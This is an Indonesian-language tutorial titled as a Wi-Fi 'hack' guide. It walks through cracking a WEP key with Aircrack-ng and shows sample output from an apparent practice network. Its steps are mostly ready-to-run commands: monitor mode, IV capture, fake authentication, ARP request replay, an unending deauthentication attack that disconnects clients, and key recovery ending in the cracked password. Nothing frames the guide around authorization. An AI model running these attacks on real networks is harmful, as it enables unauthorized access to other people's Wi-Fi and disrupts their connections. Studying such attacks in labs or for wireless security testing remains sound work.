# Hack Wi-Fi WEP (Aircrack-NG)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Koneksi internet

## Instal Tool

```
sudo apt-get update
sudo apt-get install aircrack-ng
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WEP

```
sudo airodump-ng -t wep [interface]
```

Output:

```
CH 11 ][ Elapsed: 0 s ][ 2026-01-23 12:52                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                       
                                                                                                                                                                                                                                           
 84:16:F9:FE:64:68  -29   0       13       10    0  11   54e. WEP  WEP         LATIHAN                                                                                                                                                     
                                                                                                                                                                                                                                           
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                                                                                         
                                                                                                                                                                                                                                           
 84:16:F9:FE:64:68  EA:F0:19:3D:F6:4B  -26   54e- 1e   882       17
```

Catet:
- `ESSID`: Nama Wi-Fi
- `BSSID`: MAC address AP
- `CH`: Channel AP
- `STATION`: MAC address client
- `PWR`: Kekuatan sinyal AP dalam satuan decibel-milliwatt (`dBm`)

> [!NOTE]
> Pastiin `PWR` AP target kaga di atas `-60` powernya. Kalo di atas, berarti sinyal AP target lemah, jadi proses capture paket bakal susah, IV yang didapet bakalan dikit dapetnya, sama serangan bakal jadi lama prosesnya atau malahan gagal.

#### 3. Capture IVs

```
sudo airodump-ng -N [essid] -d [bssid] -c [channel] -w [output] -i [interface]
```

#### 4. Jalanin Serangan Fake Auth

```
sudo aireplay-ng -1 0 -a [bssid] -h [mac_attacker] [interface]
```

Serangan ini dipake buat nipu AP target supaya nganggep attacker sebagai client yang sah. Tujuannya biar attacker bisa ngelakuin serangan packet injection (ARP request replay) buat ngecepetin proses ngumpulin IVs.

#### 5. Jalanin Serangan ARP Request Replay

```
sudo aireplay-ng -3 -b [bssid] -h [mac_attacker] [interface]
```

Serangan ini dipake buat nangkep satu paket ARP yang valid, terus paket itu di-replay (diputer-puter) ke AP target. Efeknya, AP bakal terus-terusan ngebales dengan paket baru yang terenkripsi, sehingga jumlah IVs naik cepet banget dan proses crack kunci WEP jadi jauh lebih cepet.

#### 6. Jalanin Serangan Deauth

```
sudo aireplay-ng -0 0 -a [bssid] -c [mac_client] [interface]
```

Serangan ini dipake buat mutusin koneksi client dari AP target. Pas client keputus, dia bakal nyoba konek ulang, dan di momen itu bakal muncul traffic baru (kaya ARP request) yang bisa ditangkep dan dipake buat crack kunci WEP.

#### 7. Pantau IVs

```
CH 11 ][ Elapsed: 2 mins ][ 2026-01-23 03:31                                                                                                                
                                                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                         
                                                                                                                                                             
 84:16:F9:FE:64:68  -29 100     1554    81641  928  11   54e. WEP  WEP    OPN  LATIHAN                                                                       
                                                                                                                                                             
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                           
                                                                                                                                                             
 84:16:F9:FE:64:68  9C:53:22:84:F7:F9  -19    0 - 1      0    42554                                                                                          
 84:16:F9:FE:64:68  EA:F0:19:3D:F6:4B  -19   54e-54e   686    41097   
```

Tungguin di kolom `#Data` nya, sampe dapet sekitar `40000` sampe `80000` an. Kalo udah dapet teken `CTRL+C` di terminal capture IVs sama serangan ARP request replay.

#### 8. Crack Kunci WEP

```
aircrack-ng -a 1 -e [essid] -b [bssid] -l [output] [file_ivs] 
```

Output:

```

                                                                     Aircrack-ng 1.7 


                                                       [00:00:00] Tested 761 keys (got 80806 IVs)

   KB    depth   byte(vote)
    0    0/  2   31(114432) F0(93952) 2A(91648) 8A(90880) A2(90368) 82(89856) 2C(89600) 69(89344) DB(89344) 1D(88576) 74(88320) 7E(88064) 
    1    4/  1   EA(90368) 19(89856) E3(89856) 2F(89600) 31(89600) 16(89344) D7(89344) AA(89088) F2(89088) 07(88832) BB(88832) DB(88064) 
    2    3/  7   02(90880) D6(90112) AF(89856) FE(89344) 1E(88832) B4(88832) C5(88832) 45(88576) 14(88320) 57(88320) 83(88320) C4(88320) 
    3    1/  2   38(94208) E7(92928) 98(90368) FF(90368) AC(90112) 37(89088) 40(88832) E5(88832) F0(88832) F7(88832) A3(88576) 6D(88320) 
    4   10/  4   17(88320) DF(87808) F8(87808) EF(87552) 2C(87296) 85(87296) 9E(87296) E4(87296) 06(87040) 73(87040) A7(87040) BC(87040) 

     KEY FOUND! [ 31:31:31:31:31:31:31:31:31:31:31:31:31 ] (ASCII: 1111111111111 )
        Decrypted correctly: 100%
```

Password Wi-Fi:
- Hex: `31:31:31:31:31:31:31:31:31:31:31:31:31`
- ASCII: `1111111111111`
